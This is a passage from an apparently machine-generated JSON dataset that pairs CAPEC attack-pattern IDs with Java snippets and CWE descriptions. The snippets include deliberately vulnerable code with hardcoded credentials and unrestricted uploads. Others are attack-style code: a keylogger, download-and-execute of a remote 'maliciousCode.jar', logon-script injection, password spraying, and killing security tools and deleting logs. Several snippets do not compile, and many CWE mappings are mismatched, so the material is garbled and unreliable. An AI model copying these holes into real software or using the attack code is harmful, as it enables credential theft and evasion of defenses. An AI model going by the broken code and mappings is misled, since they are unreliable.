        "description": "This Java code snippet demonstrates a vulnerable authentication system that embodies the CAPEC of guessing or obtaining legitimate credentials. It uses a single-factor authentication scheme with a hardcoded admin username and password, and does not implement any password aging or secure storage mechanisms. The system also allows for an unlimited number of authentication attempts, making it susceptible to brute-force attacks. Additionally, the use of a single factor in the security decision and the lack of protection for the credentials make it vulnerable to unauthorized access."
    },
    {
        "capec_id": "561",
        "code_snippet": "import java.io.IOException;\nimport java.net.InetAddress;\nimport java.net.UnknownHostException;\nimport jcifs.smb.NtlmPasswordAuthentication;\nimport jcifs.smb.SmbFile;\n\npublic class AdminShareAccess {\n    public static void main(String[] args) {\n        String username = \"admin\";\n        String password = \"password123\";\n        String domain = \"mydomain\";\n        String sharePath = \"smb://localhost/C$/\";\n\n        NtlmPasswordAuthentication auth = new NtlmPasswordAuthentication(domain, username, password);\n\n        try {\n            SmbFile smbFile = new SmbFile(sharePath, auth);\n            System.out.println(\"Connected to admin share: \" + smbFile.getCanonicalPath());\n        } catch (IOException e) {\n            System.out.println(\"Failed to connect to admin share: \" + e.getMessage());\n        }\n    }\n}\n",
        "description": "This Java code snippet demonstrates the CAPEC of accessing Windows Admin Shares using stolen or weak administrator credentials. The code uses the JCIFS library to connect to the admin share using a single-factor authentication scheme with a weak password (CWE-308, CWE-309, CWE-521). The password is hardcoded and not subject to aging or expiration (CWE-262, CWE-263). The code is also susceptible to capture-replay attacks (CWE-294) and does not protect the credentials during transmission (CWE-522)."
    },
    {
        "capec_id": "562",
        "code_snippet": "import java.io.File;\nimport java.io.FileWriter;\nimport java.io.IOException;\nimport java.net.URL;\nimport java.net.URLConnection;\n\npublic class VulnerableCode {\n    public static void main(String[] args) {\n        try {\n            // CWE-434: Unrestricted Upload of File with Dangerous Type\n            String userInput = \"http://example.com/maliciousCode.jar\";\n            URL url = new URL(userInput);\n            URLConnection conn = url.openConnection();\n            File tempFile = File.createTempFile(\"temp\", \".jar\");\n            // CWE-378: Creation of Temporary File With Insecure Permissions\n            tempFile.setReadable(true, false);\n            tempFile.setWritable(true, false);\n            // CWE-284: Improper Access Control\n            FileWriter writer = new FileWriter(tempFile);\n            writer.write(conn.getInputStream());\n            writer.close();\n            // CWE-494: Download of Code Without Integrity Check\n            Runtime.getRuntime().exec(\"java -jar \" + tempFile.getAbsolutePath());\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates the CAPEC of manipulating files in a shared location by adding malicious programs, scripts, or exploit code to valid content. It embodies CWE-434 by unrestrictedly downloading a JAR file from a user-input URL, CWE-378 by creating a temporary file with insecure permissions, CWE-284 by failing to restrict access to the temporary file, and CWE-494 by executing the downloaded code without verifying its integrity. The code also relates to CWE-433 as it stores raw content under the web document root with an extension that is not specifically handled by the server."
    },
    {
        "capec_id": "563",
        "code_snippet": "import java.io.File;\nimport java.io.FileOutputStream;\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.io.OutputStream;\nimport javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\n\npublic class VulnerableServlet extends HttpServlet {\n    protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws IOException {\n        String filename = req.getParameter(\"filename\");\n        String fileContent = req.getParameter(\"fileContent\");\n        String uploadDir = getServletContext().getRealPath(\"/uploads/\");\n        File file = new File(uploadDir, filename);\n        OutputStream out = new FileOutputStream(file);\n        out.write(fileContent.getBytes());\n        out.close();\n        resp.setStatus(200);\n    }\n}\n",
        "description": "This Java code snippet demonstrates a vulnerable servlet that allows an attacker to upload and execute malicious code on the server. The servlet accepts a filename and file content as parameters, and stores the file in the /uploads/ directory under the web document root. The file is stored with insufficient access control, allowing an attacker to upload a malicious file (e.g., a JSP file) that can be executed by the server, potentially leading to local system or administrative privileges. The code does not perform any integrity checks on the uploaded file, and relies on the file name and extension to determine the appropriate behaviors, making it vulnerable to misclassification and processing."
    },
    {
        "capec_id": "564",
        "code_snippet": "import java.io.IOException;\nimport java.io.FileWriter;\nimport java.io.File;\n\npublic class LogonScriptModifier {\n    public static void main(String[] args) {\n        String username = \"admin\";\n        String password = \"hardcodedpassword\";\n        String scriptPath = \"C:\\\\logonScripts\\\\logon.bat\";\n        String maliciousCode = \"net use \\\\\\\\remoteShare /user:domain\\\\\" + username + \" \\\\\\\\\" + password;\n\n        try {\n            File scriptFile = new File(scriptPath);\n            if (scriptFile.exists()) {\n                FileWriter writer = new FileWriter(scriptFile, true);\n                writer.write(maliciousCode);\n                writer.close();\n                System.out.println(\"Malicious code injected into logon script.\");\n            } else {\n                System.out.println(\"Logon script file not found.\");\n            }\n        } catch (IOException e) {\n            System.out.println(\"Error injecting malicious code: \" + e.getMessage());\n        }\n    }\n}\n",
        "description": "This Java code snippet demonstrates the CAPEC of modifying logon scripts to inject malicious code, which can allow an adversary to maintain persistence or move laterally within an enclave. The code uses hard-coded credentials (CWE-259) and does not restrict access to the logon script file (CWE-284), allowing an unauthorized actor to modify the script. The code also uses client-side authentication (CWE-603) and impersonation (CWE-520) to bypass workstation and enclave firewalls. The malicious code injected into the logon script can be used to access remote shares and move laterally within the network."
    },
    {
        "capec_id": "565",
        "code_snippet": "public class PasswordSprayingAttack {\n    private static final String[] COMMON_PASSWORDS = {\"password123\", \"iloveyou\", \"dragonball\"};\n    private static final int MAX_ATTEMPTS = 3;\n\n    public static void main(String[] args) {\n        String[] usernames = {\"user1\", \"user2\", \"user3\"};\n        for (String password : COMMON_PASSWORDS) {\n            for (String username : usernames) {\n                boolean isValid = authenticate(username, password);\n                if (isValid) {\n                    System.out.println(\"Valid credentials found: \" + username + \"/\" + password);\n                    return;\n                }\n            }\n        }\n    }\n\n    private static boolean authenticate(String username, String password) {\n        // Simulate authentication logic\n        // No password aging or complexity checks\n        // No account lockout mechanism\n        return username.equals(\"user1\") && password.equals(\"password123\");\n    }\n}",
        "description": "This Java code snippet demonstrates a password spraying attack, where a list of common passwords is tried against a list of usernames. The authenticate method has weak password requirements (CWE-521), no password aging (CWE-262), and no account lockout mechanism (CWE-307), making it vulnerable to brute force attacks. The code also relies on single-factor authentication (CWE-308) and uses a password system as the primary means of authentication (CWE-309)."
    },
    {
        "capec_id": "566",
        "code_snippet": "import java.security.MessageDigest;\nimport java.security.NoSuchAlgorithmException;\nimport java.util.Random;\n\npublic class InsecurePasswordHash {\n    public static void main(String[] args) throws NoSuchAlgorithmException {\n        String password = \"mysecretpassword\";\n        String salt = \"predictableSalt\";\n        String hashedPassword = hashPassword(password, salt);\n        System.out.println(\"Hashed password: \" + hashedPassword);\n    }\n\n    public static String hashPassword(String password, String salt) throws NoSuchAlgorithmException {\n        String input = password + salt;\n        MessageDigest md = MessageDigest.getInstance(\"SHA-256\");\n        byte[] bytes = md.digest(input.getBytes());\n        StringBuilder sb = new StringBuilder();\n        for (int i = 0; i < bytes.length; i++) {\n            sb.append(Integer.toString((bytes[i] & 0xff) + 0x100, 16).substring(1));\n        }\n        return sb.toString();\n    }\n}",
        "description": "This Java code snippet demonstrates the use of a one-way hash without a salt (CWE-759) and with a predictable salt (CWE-760) for password storage. The `hashPassword` function takes a password and a salt as input, concatenates them, and then uses the SHA-256 algorithm to hash the input. The resulting hash is then returned as a string. The use of a predictable salt and the lack of a salt altogether make the hashed passwords vulnerable to attacks."
    },
    {
        "capec_id": "567",
        "code_snippet": "import java.net.InetAddress;\nimport java.net.UnknownHostException;\n\npublic class VulnerableCode {\n    public static void main(String[] args) {\n        try {\n            InetAddress address = InetAddress.getByName(\"example.com\");\n            String hostname = address.getHostName();\n            // Using an obsolete function to get the hostname\n            String osName = System.getProperty(\"os.name\");\n            if (osName.equals(\"Windows\")) {\n                // Authentication bypass issue\n                System.out.println(\"Windows OS detected. Bypassing authentication...\");\n                // Perform sensitive operation without proper authentication\n                performSensitiveOperation();\n            } else {\n                System.out.println(\"Non-Windows OS detected. Proceeding with normal authentication...\");\n                // Normal authentication flow\n                authenticateUser();\n            }\n        } catch (UnknownHostException e) {\n            System.out.println(\"Unknown host exception occurred.\");\n        }\n    }\n\n    private static void performSensitiveOperation() {\n        // Sensitive operation without proper authentication\n        System.out.println(\"Performing sensitive operation...\");\n    }\n\n    private static void authenticateUser() {\n        // Normal authentication flow\n        System.out.println(\"Authenticating user...\");\n    }\n}",
        "description": "This Java code snippet demonstrates a deprecated CAPEC that incorporates multiple weaknesses. It uses an obsolete function (InetAddress.getHostName()) to get the hostname, which is a CWE-477. The code also has an authentication bypass issue (CWE-592) where it bypasses authentication for Windows OS. Additionally, it relies on DNS lookups in a security decision (CWE-247) and fails to provide confidentiality for stored data (CWE-218)."
    },
    {
        "capec_id": "568",
        "code_snippet": "import java.awt.event.KeyListener;\nimport java.awt.event.KeyEvent;\nimport java.io.FileWriter;\nimport java.io.IOException;\n\npublic class KeyLogger {\n    private static final String FILE_NAME = \"captured_keys.txt\";\n\n    public static void main(String[] args) {\n        try {\n            KeyListener listener = new KeyLogger.KeyLoggerListener();\n            java.awt.Toolkit.getDefaultToolkit().addAWTEventListener(listener, java.awt.AWTEvent.KEY_EVENT_MASK);\n\n            System.out.println(\"KeyLogger started. Press Ctrl+C to stop.\");\n            while (true) {\n                Thread.sleep(1000);\n            }\n        } catch (Exception e) {\n            System.out.println(\"Error: \" + e.getMessage());\n        }\n    }\n\n    private static class KeyLoggerListener implements KeyListener {\n        private FileWriter fileWriter;\n\n        public KeyLoggerListener() {\n            try {\n                fileWriter = new FileWriter(FILE_NAME, true);\n            } catch (IOException e) {\n                System.out.println(\"Error: \" + e.getMessage());\n            }\n        }\n\n        @Override\n        public void keyPressed(KeyEvent e) {\n            try {\n                fileWriter.write(String.valueOf(e.getKeyChar()));\n                fileWriter.flush();\n            } catch (IOException ex) {\n                System.out.println(\"Error: \" + ex.getMessage());\n            }\n        }\n\n        @Override\n        public void keyReleased(KeyEvent e) {}\n        @Override\n        public void keyTyped(KeyEvent e) {}\n    }\n}\n\n// Hard-coded credentials\npublic class Authenticator {\n    private static final String USERNAME = \"admin\";\n    private static final String PASSWORD = \"password123\";\n\n    public static boolean authenticate(String username, String password) {\n        return username.equals(USERNAME) && password.equals(PASSWORD);\n    }\n}\n",
        "description": "This Java code snippet demonstrates a keylogger that captures all keystrokes made by a user and stores them in a file. The code also includes hard-coded credentials for authentication, which is a vulnerable practice. The keylogger can be used to obtain credentials directly from a system's user, and the hard-coded credentials can be easily discovered by an attacker. The code does not implement strong password requirements, and the credentials are not stored securely, making it easier for attackers to compromise user accounts."
    },
    {
        "capec_id": "569",
        "code_snippet": "import java.io.Console;\nimport java.io.IOException;\nimport java.util.logging.ConsoleHandler;\nimport java.util.logging.Logger;\nimport java.util.logging.SimpleFormatter;\n\npublic class KeyLogger {\n    private static final Logger LOGGER = Logger.getLogger(KeyLogger.class.getName());\n\n    public static void main(String[] args) {\n        Console console = System.console();\n        if (console != null) {\n            String username = console.readLine(\"Enter username: \");\n            char[] password = console.readPassword(\"Enter password: \");\n            LOGGER.addHandler(new ConsoleHandler());\n            LOGGER.setUseParentHandlers(false);\n            SimpleFormatter formatter = new SimpleFormatter();\n            ConsoleHandler handler = (ConsoleHandler) LOGGER.getHandlers()[0];\n            handler.setFormatter(formatter);\n            LOGGER.info(\"Username: \" + username);\n            LOGGER.info(\"Password: \" + new String(password));\n        } else {\n            System.out.println(\"Failed to get console.\");\n        }\n    }\n}\n",
        "description": "This Java code snippet demonstrates a keylogger that captures sensitive user information, such as username and password, and logs it to the console. The code uses the Console class to read user input, and the Logger class to log the sensitive information. This code embodies the CAPEC idea of leveraging a mechanism to capture user-entered information, and relates to CWEs 497, 214, 69, 200, and 520, as it exposes sensitive system information and handles user input insecurely."
    },
    {
        "capec_id": "570",
        "code_snippet": "import java.net.InetAddress;\nimport java.net.UnknownHostException;\n\npublic class VulnerableCode {\n    public static void main(String[] args) {\n        try {\n            InetAddress addr = InetAddress.getByName(\"example.com\");\n            String hostname = addr.getHostName();\n            // Using an obsolete function getHostName() which can return incorrect results\n            System.out.println(\"Hostname: \" + hostname);\n        } catch (UnknownHostException e) {\n            // Ignoring the exception, which can lead to unexpected behavior\n            System.out.println(\"Error occurred\");\n        }\n    }\n}\n",
        "description": "This Java code snippet demonstrates a deprecated authentication bypass issue (CWE-592) by using an obsolete function InetAddress.getHostName() (CWE-477) which can return incorrect results. Additionally, it ignores the UnknownHostException (CWE-391) which can lead to unexpected behavior. This code does not protect stored data from modification (CWE-217) and relies on DNS lookups in a security decision (CWE-247)."
    },
    {
        "capec_id": "571",
        "code_snippet": "import java.io.File;\nimport java.io.IOException;\nimport java.util.logging.FileHandler;\nimport java.util.logging.Logger;\nimport java.util.logging.SimpleFormatter;\n\npublic class LogTampering {\n    private static Logger logger = Logger.getLogger(LogTampering.class.getName());\n\n    public static void main(String[] args) {\n        try {\n            // CWE-527: Exposure of Version-Control Repository to an Unauthorized Control Sphere\n            String repoPath = \"/path/to/repository\";\n            File repoDir = new File(repoPath);\n            if (repoDir.exists()) {\n                // CWE-532: Insertion of Sensitive Information into Log File\n                logger.info(\"Repository path: \" + repoPath);\n            }\n\n            // CWE-778: Insufficient Logging\n            logger.info(\"User login successful\");\n            // CWE-779: Logging of Excessive Data\n            for (int i = 0; i < 1000; i++) {\n                logger.info(\"Excessive log entry \" + i);\n            }\n\n            // CWE-294: Authentication Bypass by Capture-replay\n            String capturedAuthData = \"captured authentication data\";\n            // replay the captured authentication data\n            logger.info(\"Replayed authentication data: \" + capturedAuthData);\n\n            // Prevent logs from being delivered to a central location\n            FileHandler fileHandler = new FileHandler(\"logFile.log\");\n            logger.addHandler(fileHandler);\n            SimpleFormatter formatter = new SimpleFormatter();\n            fileHandler.setFormatter(formatter);\n            // delete or tamper with the log file\n            File logFile = new File(\"logFile.log\");\n            if (logFile.exists()) {\n                logFile.delete();\n            }\n        } catch (IOException e) {\n            logger.severe(\"Error: \" + e.getMessage());\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates the CAPEC of preventing host-generated logs from being delivered to a central location, making it difficult to detect indicators of compromise. It incorporates CWEs 527, 532, 778, 779, and 294 to showcase vulnerabilities in logging and authentication."
    },
    {
        "capec_id": "572",
        "code_snippet": "import java.io.File;\nimport java.io.FileOutputStream;\nimport java.io.IOException;\nimport java.nio.file.Files;\nimport java.nio.file.Paths;\nimport java.nio.file.StandardCopyOption;\n\npublic class VulnerableFileUpload {\n    public static void uploadFile(String filePath, String uploadDir) throws IOException {\n        File file = new File(filePath);\n        File uploadFolder = new File(uploadDir);\n        if (!uploadFolder.exists()) {\n            uploadFolder.mkdirs();\n        }\n        File uploadedFile = new File(uploadFolder, file.getName());\n        Files.copy(Paths.get(filePath), Paths.get(uploadedFile.getAbsolutePath()), StandardCopyOption.REPLACE_EXISTING);\n        // No restrictions on file types or sizes\n        // No validation on file contents\n        // No limits on the number of files that can be uploaded\n        // No handling of compressed files or alternate data streams\n    }\n\n    public static void main(String[] args) throws IOException {\n        uploadFile(\"/path/to/file\", \"/path/to/upload/directory\");\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable file upload functionality that allows an adversary to modify file contents by adding data to files, potentially leading to a Denial of Service condition due to unlimited file uploads. The code does not restrict file types, sizes, or contents, and does not handle compressed files or alternate data streams, making it vulnerable to CWE-774, CWE-434, CWE-646, CWE-409, and CWE-69."
    },
    {
        "capec_id": "573",
        "code_snippet": "import java.io.BufferedReader;\nimport java.io.IOException;\nimport java.io.InputStreamReader;\n\npublic class ProcessInfoExposure {\n    public static void main(String[] args) {\n        try {\n            Process process = Runtime.getRuntime().exec(\"tasklist\");\n            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));\n            String line;\n            while ((line = reader.readLine()) != null) {\n                System.out.println(line);\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates the CAPEC of exploiting functionality to identify information about currently running processes on the target system. It uses the Runtime.getRuntime().exec() method to execute the 'tasklist' command, which lists all running processes on the system. The output is then printed to the console, potentially exposing sensitive information to an unauthorized actor (CWE-200). The code also violates CWE-497 by not properly preventing sensitive system-level information from being accessed. Additionally, the use of the 'tasklist' command with visible sensitive information (CWE-214) and the potential creation of an emergent resource (CWE-1229) that can be used by attackers are also demonstrated. Furthermore, this code may also be vulnerable to CWE-1423, as it may allow code to influence transient execution across a hardware boundary, potentially exposing data that is accessible beyond the boundary over a covert channel."
    },
    {
        "capec_id": "574",
        "code_snippet": "import java.io.BufferedReader;\nimport java.io.IOException;\nimport java.io.InputStreamReader;\n\npublic class ServiceEnumerator {\n    public static void main(String[] args) {\n        try {\n            Process process = Runtime.getRuntime().exec(\"tasklist /svc\");\n            BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(process.getInputStream()));\n            String line;\n            while ((line = bufferedReader.readLine()) != null) {\n                System.out.println(line);\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}\n",
        "description": "This Java code snippet demonstrates the CAPEC of exploiting functionality to identify information about services on the target system. It uses the 'tasklist /svc' command to enumerate services, which can be used by an adversary to learn about the target environment. This code embodies CWE-200, CWE-497, CWE-1249, CWE-214, and CWE-1229, as it exposes sensitive system information to unauthorized actors, provides an inconsistent view of the underlying operating system, and uses sensitive command-line arguments."
    },
    {
        "capec_id": "575",
        "code_snippet": "import java.io.BufferedReader;\nimport java.io.IOException;\nimport java.io.InputStreamReader;\nimport java.util.ArrayList;\nimport java.util.List;\n\npublic class DomainAccountEnumerator {\n    public static void main(String[] args) {\n        try {\n            Process process = Runtime.getRuntime().exec(\"net user\");\n            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));\n            String line;\n            List<String> domainAccounts = new ArrayList<>();\n            while ((line = reader.readLine()) != null) {\n                domainAccounts.add(line);\n            }\n            // Print or store the domain accounts and their permissions\n            System.out.println(\"Domain Accounts: \" + domainAccounts);\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates the CAPEC by executing the Windows command 'net user' to enumerate domain accounts and their permissions on the target system. The code does not properly restrict access to this sensitive information, exposing it to unauthorized actors (CWE-200, CWE-497). The code also uses an application-level admin tool ('net user' command) with an inconsistent view of the underlying operating system (CWE-1249). Additionally, the code invokes a process using visible sensitive information (CWE-214) and may expose access control list files to an unauthorized control sphere (CWE-529)."
    },
    {
        "capec_id": "576",
        "code_snippet": "import java.io.BufferedReader;\nimport java.io.IOException;\nimport java.io.InputStreamReader;\nimport java.util.ArrayList;\nimport java.util.List;\n\npublic class GroupEnumerator {\n    public static void main(String[] args) {\n        try {\n            Process process = Runtime.getRuntime().exec(\"net localgroup\");\n            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));\n            String line;\n            List<String> groups = new ArrayList<>();\n            while ((line = reader.readLine()) != null) {\n                groups.add(line);\n            }\n            // Print or store the list of groups, potentially exposing sensitive information\n            System.out.println(groups);\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}\n",
        "description": "This Java code snippet demonstrates the CAPEC by executing the Windows command 'net localgroup' to enumerate local groups on the system. The output is stored in a list and printed to the console, potentially exposing sensitive information to an unauthorized actor (CWE-200). The code also relates to CWE-842, CWE-529, CWE-214, and CWE-1229 as it invokes a process with visible sensitive information, manages resources in a way that creates a new emergent resource, and potentially places a user into an incorrect group or exposes access control list files to an unauthorized control sphere."
    },
    {
        "capec_id": "577",
        "code_snippet": "import java.io.File;\nimport java.io.IOException;\nimport java.nio.file.Files;\nimport java.nio.file.Paths;\nimport java.nio.file.attribute.BasicFileAttributes;\nimport java.util.logging.FileHandler;\nimport java.util.logging.Logger;\nimport java.util.logging.SimpleFormatter;\n\npublic class SensitiveInfoExposure {\n    private static final Logger LOGGER = Logger.getLogger(SensitiveInfoExposure.class.getName());\n\n    public static void main(String[] args) throws IOException {\n        File userDir = new File(System.getProperty(\"user.home\"));\n        File[] files = userDir.listFiles();\n        for (File file : files) {\n            if (file.getName().equals(\"ntuser.dat\")) {\n                BasicFileAttributes attr = Files.readAttributes(Paths.get(file.getAbsolutePath()), BasicFileAttributes.class);\n                LOGGER.info(\"Last login time for user: \" + attr.lastAccessTime());\n                // Create a temporary file in the user's directory with insecure permissions\n                File tempFile = new File(file.getParent(), \"temp.txt\");\n                tempFile.createNewFile();\n                // Log the temporary file's existence\n                LOGGER.info(\"Temporary file created: \" + tempFile.getAbsolutePath());\n                // Invoke a process with visible sensitive information\n                Process process = new ProcessBuilder(\"cmd\", \"/c\", \"dir\", \"/A\", tempFile.getAbsolutePath()).start();\n                // Expose sensitive system information to an unauthorized control sphere\n                LOGGER.info(\"System properties: \" + System.getProperties());\n                // Create an application-level admin tool with an inconsistent view of the underlying OS\n                LOGGER.info(\"User directory contents: \" + files);\n                break;\n            }\n        }\n    }\n}\n",
        "description": "This Java code snippet demonstrates the CAPEC of exploiting functionality to identify information about primary users on the target system. It exposes sensitive information to an unauthorized actor (CWE-200), invokes a process with visible sensitive information (CWE-214), creates a temporary file in a directory with insecure permissions (CWE-379), exposes sensitive system information to an unauthorized control sphere (CWE-497), and creates an application-level admin tool with an inconsistent view of the underlying OS (CWE-1249)."
    },
    {
        "capec_id": "578",
        "code_snippet": "public class SecurityDisabler {\n    private static final String SECURITY_TOOL_PROCESS = \"SecurityTool.exe\";\n    private static final String SECURITY_TOOL_REGISTRY_KEY = \"HKEY_LOCAL_MACHINE\\SOFTWARE\\SecurityTool\";\n    private static final String LOG_FILE_PATH = \"C:\\logs\\security.log\";\n\n    public static void disableSecurity() {\n        // CWE-284: Improper Access Control\n        // CWE-671: Lack of Administrator Control over Security\n        try {\n            // Kill the security tool process\n            Runtime.getRuntime().exec(\"taskkill /im \" + SECURITY_TOOL_PROCESS);\n\n            // Delete the security tool registry key\n            java.util.prefs.Preferences prefs = java.util.prefs.Preferences.systemRoot();\n            prefs.node(SECURITY_TOOL_REGISTRY_KEY).removeNode();\n\n            // Delete the log file\n            java.io.File logFile = new java.io.File(LOG_FILE_PATH);\n            logFile.delete();\n        } catch (Exception e) {\n            // CWE-798: Use of Hard-coded Credentials\n            // Hard-coded credentials for logging\n            String logUsername = \"admin\";\n            String logPassword = \"password123\";\n            System.out.println(\"Error disabling security: \" + e.getMessage() + \" - logged in as \" + logUsername + \":\" + logPassword);\n        }\n    }\n\n    public static void main(String[] args) {\n        disableSecurity();\n    }\n}\n",
        "description": "This Java code snippet demonstrates the CAPEC of disabling security tools by exploiting weaknesses in access control. It kills a security tool process, deletes a registry key, and removes a log file. The code also includes CWE-798: Use of Hard-coded Credentials for logging. Additionally, the code lacks proper access control and administrator control over security, as described in CWE-284 and CWE-671. Furthermore, the code may be vulnerable to CWE-1037: Processor Optimization Removal or Modification of Security-critical Code and CWE-733: Compiler Optimization Removal or Modification of Security-critical Code, depending on the compiler and processor used."
    },
    {
        "capec_id": "579",
        "code_snippet": "import java.io.File;\nimport java.io.IOException;\nimport java.util.Properties;\n\npublic class VulnerableWinlogon {\n    public static void main(String[] args) {\n        // CWE-15: External Control of System or Configuration Setting\n        String userConfig = System.getProperty(\"user.config\");\n        String maliciousDLL = \"C:\\\\malicious\\\\dll.dll\";\n        try {\n            // CWE-427: Uncontrolled Search Path Element\n            System.setProperty(\"java.library.path\", userConfig + \";\" + maliciousDLL);\n            // CWE-798: Use of Hard-coded Credentials\n            String hardcodedCreds = \"username:password\";\n            // CWE-520: .NET Misconfiguration: Use of Impersonation\n            // Impersonating a user with elevated privileges\n            impersonateUser(hardcodedCreds);\n            // CWE-558: Use of getlogin() in Multithreaded Application\n            String username = getlogin();\n            System.out.println(\"Loaded malicious DLL for user: \" + username);\n        } catch (IOException e) {\n            System.out.println(\"Error loading malicious DLL\");\n        }\n    }\n\n    // CWE-558: Use of getlogin() in Multithreaded Application\n    private static native String getlogin();\n\n    // CWE-520: .NET Misconfiguration: Use of Impersonation\n    private static void impersonateUser(String creds) {\n        // Impersonation logic here\n    }\n}",
        "description": "Java code snippet demonstrating the CAPEC of exploiting Winlogon to load a malicious DLL on startup, incorporating CWEs 15, 427, 520, 558, and 798."
    },
    {
        "capec_id": "580",
        "code_snippet": "public class RemoteSystemProber {\n    public static void main(String[] args) {\n        String[] paths = {\"/usr/bin\", \"/usr/local/bin\", \"/bin\"};\n        for (String path : paths) {\n            try {\n                Process p = Runtime.getRuntime().exec(new String[]{\"ls\", \"-l\", path});\n                p.waitFor();\n                if (p.exitValue() == 0) {\n                    System.out.println(\"Directory exists: \" + path);\n                } else {\n                    System.out.println(\"Directory does not exist: \" + path);\n                }\n            } catch (Exception e) {\n                System.out.println(\"Error: \" + e.getMessage());\n            }\n        }\n    }\n}\n",
        "description": "This Java code snippet demonstrates a remote system prober that uses the CWEs 204, 205, 208, 497, and 426 to gather information about a remote system. It uses the 'ls' command to probe for directory existence, which can reveal system-level information. The code also uses an untrusted search path, which can lead to the execution of arbitrary code. The observable response discrepancy (CWE 204) is demonstrated by the different exit values of the 'ls' command, which can be used to infer the existence or non-existence of directories. The observable behavioral discrepancy (CWE 205) is shown by the different times it takes to complete the 'ls' command, which can reveal information about the system's configuration. The observable timing discrepancy (CWE 208) is demonstrated by the time it takes to execute the 'ls' command, which can be used to infer the system's load or configuration. The exposure of sensitive system information (CWE 497) is demonstrated by the revelation of directory existence, which can be used to launch further attacks. Finally, the untrusted search path (CWE 426) is demonstrated by the use of an externally-supplied search path, which can lead to the execution of arbitrary code."
    },
    {
        "capec_id": "581",
        "code_snippet": "import java.io.File;\nimport java.io.IOException;\nimport java.util.ArrayList;\nimport java.util.List;\n\npublic class SecurityToolEnumerator {\n    public static void main(String[] args) {\n        List<String> securityTools = new ArrayList<>();\n        File dir = new File(\"C:\\\\Program Files\");\n        File[] files = dir.listFiles();\n        for (File file : files) {\n            if (file.isDirectory()) {\n                String dirName = file.getName();\n                if (dirName.contains(\"Security\") || dirName.contains(\"Antivirus\") || dirName.contains(\"Firewall\")) {\n                    securityTools.add(dirName);\n                }\n            }\n        }\n        System.out.println(\"Security Tools Installed: \" + securityTools);\n        // Malicious code to send the list of security tools to an unauthorized actor\n        sendToUnauthorizedActor(securityTools);\n    }\n\n    private static void sendToUnauthorizedActor(List<String> securityTools) {\n        // Code to send the list of security tools to an unauthorized actor\n        // This could be a malicious HTTP request or a socket connection\n        // For demonstration purposes, we'll just print the list\n        System.out.println(\"Sending security tools to unauthorized actor: \" + securityTools);\n    }\n}",
        "description": "This Java code snippet demonstrates the CAPEC of enumerating security tools installed on a system and their configurations. The code lists all directories in the 'C:\\\\Program Files' directory and checks if the directory name contains keywords like 'Security', 'Antivirus', or 'Firewall'. If a match is found, the directory name is added to a list of security tools. The list is then sent to an unauthorized actor, which is a malicious action. This code embodies CWE-497 (Exposure of Sensitive System Information to an Unauthorized Control Sphere), CWE-506 (Embedded Malicious Code), CWE-512 (Spyware), and CWE-507 (Trojan Horse)."
    },
    {
        "capec_id": "582",
        "code_snippet": "import java.net.Socket;\nimport java.net.UnknownHostException;\nimport java.io.IOException;\nimport java.io.PrintWriter;\nimport java.net.InetSocketAddress;\nimport java.net.Proxy;\n\npublic class NetworkRouteDisabler {\n    public static void main(String[] args) {\n        String targetHost1 = \"target1.example.com\";\n        int targetPort1 = 80;\n        String targetHost2 = \"target2.example.com\";\n        int targetPort2 = 80;\n\n        // CWE-923: Improper Restriction of Communication Channel to Intended Endpoints\n        Socket socket = new Socket();\n        try {\n            socket.connect(new InetSocketAddress(targetHost1, targetPort1));\n            socket.setSoTimeout(1000);\n            PrintWriter out = new PrintWriter(socket.getOutputStream(), true);\n            out.println(\"GET / HTTP/1.1\\r\\nHost: \" + targetHost1 + \"\\r\\n\\r\\n\");\n\n            // CWE-924: Improper Enforcement of Message Integrity During Transmission in a Communication Channel\n            // No message integrity check is performed on the received response\n            byte[] buffer = new byte[1024];\n            int bytesRead = socket.getInputStream().read(buffer);\n            String response = new String(buffer, 0, bytesRead);\n            System.out.println(response);\n\n            // CWE-941: Incorrectly Specified Destination in a Communication Channel\n            // Incorrectly specify the destination host\n            socket.connect(new InetSocketAddress(\"wrong-host.example.com\", targetPort2));\n\n            // CWE-1334: Unauthorized Error Injection Can Degrade Hardware Redundancy\n            // Simulate error injection by closing the socket\n            socket.close();\n\n            // CWE-421: Race Condition During Access to Alternate Channel\n            // Open an alternate channel that is accessible to other actors\n            Socket alternateSocket = new Socket(new Proxy(Proxy.Type.HTTP, new InetSocketAddress(\"proxy.example.com\", 8080)));\n            alternateSocket.connect(new InetSocketAddress(targetHost2, targetPort2));\n        } catch (UnknownHostException e) {\n            System.err.println(\"Unknown host: \" + e.getMessage());\n        } catch (IOException e) {\n            System.err.println(\"I/O error: \" + e.getMessage());\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates the CAPEC of disabling the network route between two targets by exploiting various CWEs. It establishes a communication channel with an endpoint without properly ensuring message integrity, incorrectly specifies the destination host, injects errors to degrade hardware redundancy, and opens an alternate channel accessible to other actors, ultimately severing the communications channel between the two targets."
    },
    {
        "capec_id": "583",
